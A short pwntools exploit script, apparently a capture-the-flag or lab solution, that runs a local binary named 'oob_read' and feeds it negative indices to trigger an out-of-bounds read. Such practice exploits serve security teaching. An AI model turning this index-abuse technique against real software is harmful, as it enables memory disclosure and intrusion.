#!/usr/bin/env python3

from pwn import *

TARGET = './oob_read'

p = process(TARGET)

payload = b'-130 -120 -110 -100'
p.sendlineafter(b'your index: ', payload)

p.interactive()
